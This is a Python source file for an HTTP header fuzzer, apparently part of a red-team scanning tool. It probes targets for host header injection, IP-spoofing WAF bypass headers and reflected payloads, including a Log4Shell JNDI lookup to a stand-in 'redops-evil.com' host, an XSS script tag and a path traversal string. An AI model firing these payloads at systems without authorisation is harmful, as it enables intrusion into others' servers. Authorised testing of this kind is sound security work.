import requests
from scan_engine.helpers.process_manager import ProcessManager

class HeaderFuzzer:
    def __init__(self, target):
        self.target = target
        # Red Team Headers used for bypass and injection tests
        self.fuzz_headers = {
            "X-Forwarded-For": ["127.0.0.1", "localhost", "192.168.0.1", "10.0.0.1"],
            "X-Forwarded-Host": ["localhost", "127.0.0.1"],
            "X-Host": ["localhost"],
            "X-Originating-IP": ["127.0.0.1"],
            "X-Remote-IP": ["127.0.0.1"],
            "X-Remote-Addr": ["127.0.0.1"],
            "Client-IP": ["127.0.0.1"]
        }
        self.injection_payloads = [
            "'{'\"${jndi:ldap://redops-evil.com/a}\"}'", # Log4Shell (Safe probe)
            "\"><script>alert('RedOps3-Header-XSS')</script>", # XSS
            "admin",
            "../../../etc/passwd" # Path Traversal hint
        ]

    def audit_headers(self, port, protocol='http', logger=None):
        """
        Performs advanced fuzzing on HTTP headers to detect misconfigurations and bypasses.
        """
        url = f"{protocol}://{self.target}:{port}"
        findings = []
        
        if logger: logger(f"Advanced: Starting HTTP Header Fuzzing on {url}...", "INFO")

        # 1. Base Request for baseline
        try:
            baseline_resp = requests.get(url, timeout=5, verify=False, allow_redirects=False)
            baseline_len = len(baseline_resp.content)
            baseline_status = baseline_resp.status_code
        except:
            return []

        # 2. Test for Host Header Injection
        test_host = "redops-evil-host.com"
        try:
            r_host = requests.get(url, headers={"Host": test_host}, timeout=5, verify=False, allow_redirects=False)
            # If 301/302 and Location contains our evil host
            loc = r_host.headers.get("Location", "")
            if test_host in loc or test_host in r_host.text:
                findings.append({
                    "title": f"Host Header Injection ({port})",
                    "description": f"The application reflects or redirects to an arbitrary Host header: {test_host}.\nTarget: {url}",
                    "severity": "medium",
                    "tool_source": "header_fuzzer"
                })
        except: pass

        # 3. Test for WAF Bypass / IP Spoofing
        for header, values in self.fuzz_headers.items():
            for val in values:
                try:
                    r_bypass = requests.get(url, headers={header: val}, timeout=5, verify=False, allow_redirects=False)
                    # If status code or response length significantly changes, it's a lead
                    if r_bypass.status_code != baseline_status and r_bypass.status_code == 200:
                         findings.append({
                            "title": f"Potential WAF Bypass ({port})",
                            "description": f"Accessing with {header}: {val} changed status from {baseline_status} to {r_bypass.status_code}. This may bypass IP-based filters.",
                            "severity": "high",
                            "tool_source": "header_fuzzer"
                        })
                except: continue

        # 4. Test for Injection in Common Headers (User-Agent, Referer)
        for payload in self.injection_payloads:
            try:
                # Test User-Agent reflection
                r_ua = requests.get(url, headers={"User-Agent": payload}, timeout=5, verify=False)
                if payload in r_ua.text:
                    findings.append({
                        "title": f"Header Reflection in Body ({port})",
                        "description": f"User-Agent payload was reflected in the response body. Potential for XSS or Log injection.\nPayload: {payload}",
                        "severity": "low",
                        "tool_source": "header_fuzzer"
                    })
            except: continue

        return findings
